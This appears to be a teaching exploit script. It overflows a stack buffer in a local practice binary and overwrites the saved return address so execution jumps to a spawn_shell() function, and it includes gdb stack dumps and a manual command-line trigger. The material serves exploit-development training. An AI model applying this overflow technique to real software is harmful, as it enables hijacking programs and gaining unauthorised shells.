#!/usr/bin/python3
import sys
from subprocess import Popen, PIPE
import shlex
import struct

'''
TEACHING
Let's try hijacking code flow by 'overwriting saved return address' and directing (re-programming) the execution
flow to spawn_shell() defined in target software.

Exploit Development on 
> x86-64 Arch => Linux kali 6.1.0-kali5-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.12-1kali2 (2023-02-23) x86_64 GNU/Linux
> ARM Arch => 

Triggering manual exploitation
$ ./003_auth_overflow2.elf $(python2 -c 'print "A"*40 + "\x76\x11\x40"')  

STACK DIAGRAM for - int check_authentication(char *password)

        +------------+ <-- rbp-0x20
        |  password  |
        +------------+
		...					[40 bytes to corrupt saved RIP]
		...
        +------------+ <-- rbp-0x4
        |  auth_flag |
        +------------+ <-- rbp
        |  saved FP  |
        +------------+
        |  saved RIP |
        +------------+

(gdb) print spawn_shell
$1 = {void ()} 0x401176 <spawn_shell>

STACK state before ACID rain
(gdb) x/10xg $rsp
0x7fffffffdcd0: 0x0000000000000000      0x00007fffffffe1ea
0x7fffffffdce0: 0x0000000000000000      0x0000000000000000
0x7fffffffdcf0: 0x0000000000000000      0x0000000000000000
0x7fffffffdd00: 0x00007fffffffdd20      0x000000000040126c
0x7fffffffdd10: 0x00007fffffffde38      0x0000000200000000

STACK state after ACID rain
(gdb) x/10xg $rsp
0x7fffffffdcd0: 0x0000000000000000      0x00007fffffffe1ea
0x7fffffffdce0: 0x4141414141414141      0x4141414141414141
0x7fffffffdcf0: 0x4141414141414141      0x4141414141414141
0x7fffffffdd00: 0x4141414141414141      0x0000000000401176
0x7fffffffdd10: 0x00007fffffffde38      0x0000000200000000
(gdb) x/2xg $rbp
0x7fffffffdd00: 0x4141414141414141      0x0000000000401176
'''

target = "./003_auth_overflow2.elf"
shellcode = "./shellcode/execve_binsh.raw"

# CREATE payload
payload = bytearray()
payload += ("A"*40).encode('utf-8')
# packing address 0x401176 - spawn_shell()
payload += b'\x76'
payload += b'\x11'
payload += b'\x40'

print ("CREATED payload: ", end='')
print (payload)

# WRITE payload to DISK (useful to trigger manual exploitation)
filename = 'malinput.' + target[:-4].replace("./", "") + "." + sys.argv[0].replace("./", '')[:11]
fo = open( filename, 'wb')
fo.write(payload)
fo.close()
print ("WROTE payload to disk: " + filename)

# -x-x-x-x- SEND payload to vulnerable process -x-x-x-x-

print ("SENDING payload to target process: " + target)
print ()

# Send payload via CMD Line arguments
# AIM: $ cat | ./<target> <payload>
pivot = Popen("cat".split(), stdout=PIPE)					# 'cat' should take STDIN from terminal itself
p = Popen([target, bytes(payload)], stdin=pivot.stdout)		# 'target' should take STDIN from 'cat' prog's STDOUT
pivot.wait()
# press Ctrl+d to terminate 'cat' process

'''
# Send payload via ENVIRONMENT variable
'''

'''
# Send payload via STDIN
p = Popen(shlex.split(target), stdin=PIPE)
p.stdin.write(payload)
p.stdin.flush()
'''
